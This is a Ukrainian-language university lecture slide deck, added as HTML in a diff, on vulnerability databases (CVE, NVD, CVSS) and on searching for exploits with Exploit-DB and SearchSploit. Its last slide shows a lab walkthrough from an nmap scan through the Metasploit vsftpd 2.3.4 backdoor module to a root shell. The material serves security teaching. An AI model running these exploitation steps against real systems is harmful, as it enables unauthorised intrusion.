@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Тема 5.5 — Бази вразливостей та CVE</title>
+  <link rel="icon" type="image/svg+xml" href="../../img/favicon.svg">
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../css/slides.css">
+</head>
+<body data-lecture="5">
+  <div class="slide-deck">
+
+    <!-- Slide 1: Title -->
+    <section class="slide active title-slide">
+      <h1>Бази вразливостей та CVE</h1>
+      <div class="subtitle">Тема 5.5 — Фреймворк Metasploit та експлуатація</div>
+      <p>Кафедра ТЕІБ, Ужгородський національний університет</p>
+    </section>
+
+    <!-- Slide 2: Система CVE -->
+    <section class="slide">
+      <h2>Система CVE</h2>
+      <div class="info-box">
+        <strong>CVE</strong> (Common Vulnerabilities and Exposures) — стандартизована система ідентифікації вразливостей, підтримувана MITRE Corporation з 1999 року. Формат: <span class="highlight">CVE-YYYY-NNNNN</span>
+      </div>
+
+      <div class="two-column">
+        <div class="column">
+          <div class="card-blue">
+            <h3>CVE — Common Vulnerabilities and Exposures</h3>
+            <ul>
+              <li><strong>Унікальний ID</strong> для кожної вразливості</li>
+              <li>Підтримується <span class="highlight">MITRE Corporation</span> з 1999 року</li>
+              <li><strong>CNA</strong> (CVE Numbering Authority) — організації, які присвоюють CVE ID</li>
+              <li>Формат: CVE-рік-номер (CVE-2024-12345)</li>
+            </ul>
+          </div>
+        </div>
+        <div class="column">
+          <div class="card-green">
+            <h3>NVD — National Vulnerability Database</h3>
+            <ul>
+              <li>База даних <span class="highlight">NIST</span>, збагачена версія CVE</li>
+              <li>Додає <strong>CVSS</strong> оцінки критичності</li>
+              <li><strong>CPE</strong> (Common Platform Enumeration) — ідентифікатори продуктів</li>
+              <li>Посилання на патчі, експлойти, статті</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+
+      <div class="two-column" style="margin-top: 1.5rem;">
+        <div class="stat-item">
+          <strong>200,000+</strong> CVE записів усього
+        </div>
+        <div class="stat-item">
+          <strong>25,000+</strong> нових CVE щороку (2024)
+        </div>
+      </div>
+    </section>
+
+    <!-- Slide 3: CVSS Scoring -->
+    <section class="slide">
+      <h2>CVSS Scoring — оцінка критичності</h2>
+
+      <h3>Рівні критичності CVSS v3.1</h3>
+      <table class="comparison-table">
+        <thead>
+          <tr>
+            <th>Рівень</th>
+            <th>Діапазон оцінки</th>
+            <th>Опис</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td class="cell-green"><strong>None</strong></td>
+            <td>0.0</td>
+            <td>Вразливість відсутня</td>
+          </tr>
+          <tr>
+            <td class="cell-green"><strong>Low</strong></td>
+            <td>0.1–3.9</td>
+            <td>Низька загроза, мінімальний вплив</td>
+          </tr>
+          <tr>
+            <td class="cell-yellow"><strong>Medium</strong></td>
+            <td>4.0–6.9</td>
+            <td>Середня загроза, можливі обмежені наслідки</td>
+          </tr>
+          <tr>
+            <td class="cell-red"><strong>High</strong></td>
+            <td>7.0–8.9</td>
+            <td>Висока загроза, серйозний вплив на систему</td>
+          </tr>
+          <tr>
+            <td class="cell-red"><strong>Critical</strong></td>
+            <td>9.0–10.0</td>
+            <td>Критична загроза, максимальний ризик</td>
+          </tr>
+        </tbody>
+      </table>
+
+      <div class="info-box" style="margin-top: 1.5rem;">
+        <h3>Базові метрики CVSS</h3>
+        <ul>
+          <li><strong>Attack Vector</strong> (AV) — мережевий, сусідній, локальний, фізичний</li>
+          <li><strong>Attack Complexity</strong> (AC) — низька чи висока складність експлуатації</li>
+          <li><strong>Privileges Required</strong> (PR) — чи потрібна автентифікація</li>
+          <li><strong>User Interaction</strong> (UI) — чи потрібна дія користувача</li>
+          <li><strong>Scope</strong> (S) — чи змінюється контекст безпеки</li>
+          <li><strong>CIA Impact</strong> — вплив на Confidentiality, Integrity, Availability</li>
+        </ul>
+      </div>
+
+      <div class="warning-box">
+        <strong>Приклад:</strong> EternalBlue <span class="highlight">CVE-2017-0144</span> — CVSS <strong>9.8 Critical</strong> (мережевий, без автентифікації, RCE у Windows SMB)
+      </div>
+    </section>
+
+    <!-- Slide 4: Пошук експлойтів -->
+    <section class="slide">
+      <h2>Пошук експлойтів</h2>
+
+      <div class="three-col-grid">
+        <div class="card-blue">
+          <h3>Exploit-DB</h3>
+          <ul>
+            <li><strong>exploit-db.com</strong></li>
+            <li>Перевірені експлойти з CVE</li>
+            <li>Google Hacking Database (GHDB)</li>
+            <li>Papers, shellcodes</li>
+            <li>Архів з 1999 року</li>
+          </ul>
+        </div>
+
+        <div class="card-green">
+          <h3>SearchSploit</h3>
+          <ul>
+            <li>Офлайн пошук по Exploit-DB</li>
+            <li>CLI інструмент (Kali)</li>
+            <li><span class="highlight">searchsploit</span> команда</li>
+            <li>Копіювання експлойтів локально</li>
+            <li>Інтеграція з Nmap</li>
+          </ul>
+        </div>
+
+        <div class="card-red">
+          <h3>Інші джерела</h3>
+          <ul>
+            <li><strong>0day.today</strong> — zero-day експлойти</li>
+            <li><strong>PacketStorm</strong> — новини + експлойти</li>
+            <li><strong>GitHub</strong> — PoC коди</li>
+            <li>Vendor advisories (Microsoft, Cisco)</li>
+            <li>OSVDB (історичні дані)</li>
+          </ul>
+        </div>
+      </div>
+
+      <h3 style="margin-top: 1.5rem;">SearchSploit — основні команди</h3>
+      <div class="code-block">
+        <span class="code-comment"># Пошук експлойтів для vsftpd 2.3</span><br>
+        <span class="code-keyword">searchsploit</span> vsftpd <span class="code-string">2.3</span><br><br>
+        <span class="code-comment"># Копіювання експлойта в поточний каталог</span><br>
+        <span class="code-keyword">searchsploit</span> <span class="code-function">-m</span> <span class="code-string">49757</span><br><br>
+        <span class="code-comment"># Пошук за CVE номером</span><br>
+        <span class="code-keyword">searchsploit</span> <span class="code-function">--cve</span> <span class="code-string">2021-44228</span><br><br>
+        <span class="code-comment"># Інтеграція з результатами Nmap XML</span><br>
+        <span class="code-keyword">searchsploit</span> <span class="code-function">--nmap</span> results.xml
+      </div>
+    </section>
+
+    <!-- Slide 5: Практичний workflow -->
+    <section class="slide">
+      <h2>Практичний workflow пошуку вразливостей</h2>
+
+      <div class="flow-row">
+        <div class="flow-step">Vulnerability found</div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-step">Search CVE</div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-step">Check CVSS</div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-step">Find exploit</div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-step">Verify/test</div>
+      </div>
+
+      <h3 style="margin-top: 1.5rem;">Приклад: від сканування до експлуатації</h3>
+      <div class="two-column">
+        <div class="column">
+          <div class="card-purple">
+            <h4>1. Nmap знайшов сервіс</h4>
+            <div class="code-block">
+              <span class="code-keyword">nmap</span> <span class="code-function">-sV</span> 192.168.1.50<br>
+              <span class="code-comment">21/tcp open ftp vsftpd 2.3.4</span>
+            </div>
+          </div>
+
+          <div class="card-blue" style="margin-top: 1rem;">
+            <h4>2. Пошук CVE та експлойта</h4>
+            <div class="code-block">
+              <span class="code-keyword">searchsploit</span> vsftpd <span class="code-string">2.3.4</span><br>
+              <span class="code-comment">vsftpd 2.3.4 - Backdoor Command Execution</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="column">
+          <div class="card-green">
+            <h4>3. Metasploit пошук</h4>
+            <div class="code-block">
+              <span class="code-keyword">msf6</span> > <span class="code-function">search</span> <span class="code-string">vsftpd 2.3.4</span><br>
+              <span class="code-keyword">msf6</span> > <span class="code-function">use</span> exploit/unix/ftp/vsftpd_234_backdoor<br>
+              <span class="code-keyword">msf6</span> > <span class="code-function">set</span> RHOSTS 192.168.1.50<br>
+              <span class="code-keyword">msf6</span> > <span class="code-function">exploit</span>
+            </div>
+          </div>
+
+          <div class="success-box" style="margin-top: 1rem;">
+            <strong>Результат:</strong> shell отриманий, доступ до системи як root
+          </div>
+        </div>
+      </div>
+
+      <div class="info-box" style="margin-top: 1.5rem;">
+        <strong>Ключові ресурси:</strong> NVD (nvd.nist.gov), CVE (cve.mitre.org), Exploit-DB (exploit-db.com), CVSS Calculator (first.org/cvss/calculator)
+      </div>
+    </section>
+
+  </div>
+
+  <div class="slide-counter" id="counter"></div>
+  <div class="slide-progress" id="progress"></div>
+  <div class="controls">
+    <button id="btn-prev" onclick="prev()">&#8592;</button>
+    <button id="btn-next" onclick="next()">&#8594;</button>
+  </div>
+  <script src="../../js/slides.js"></script>
+</body>
+</html>
